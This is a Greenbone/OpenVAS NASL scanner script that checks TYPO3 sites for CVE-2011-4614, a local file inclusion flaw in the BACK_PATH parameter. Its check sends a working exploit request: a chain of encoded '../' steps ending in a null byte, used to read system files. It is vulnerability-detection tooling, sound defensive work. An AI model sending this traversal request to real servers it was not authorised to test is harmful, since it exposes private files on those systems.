CPE = "cpe:/a:typo3:typo3";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902795" );
	script_version( "2021-08-06T11:34:45+0000" );
	script_cve_id( "CVE-2011-4614" );
	script_bugtraq_id( 51090 );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2021-08-06 11:34:45 +0000 (Fri, 06 Aug 2021)" );
	script_tag( name: "creation_date", value: "2012-02-22 13:46:49 +0530 (Wed, 22 Feb 2012)" );
	script_name( "TYPO3 'BACK_PATH' Parameter Local File Include Vulnerability" );
	script_tag( name: "impact", value: "Successful exploitation could allow an attacker to obtain arbitrary local
files in the context of an affected site." );
	script_tag( name: "vuldetect", value: "Send a Crafted HTTP GET request and check whether it is able to get sensitive
information." );
	script_tag( name: "insight", value: "The flaw is due to an input passed to the 'BACK_PATH' parameter in
'typo3/sysext/workspaces/Classes/Controller/AbstractController.php' is not
properly verified before being used to include files." );
	script_tag( name: "solution", value: "Upgrade to TYPO3 version 4.5.9 or 4.6.2 or later." );
	script_tag( name: "summary", value: "This host is running TYPO3 and is prone to local file inclusion vulnerability." );
	script_tag( name: "affected", value: "TYPO3 version 4.5.x before 4.5.9, 4.6.x before 4.6.2 and development versions
of 4.7" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/47201" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/72959" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_typo3_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "TYPO3/installed" );
	script_xref( name: "URL", value: "http://typo3.org/download/packages/" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
files = traversal_files();
for file in keys( files ) {
	url = NASLString( dir, "/sysext/workspaces/Classes/Controller/" + "AbstractController.php?BACK_PATH=", crap( data: "..%2f", length: 5 * 10 ), files[file], "%00" );
	if(http_vuln_check( port: port, url: url, pattern: file )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 99 );

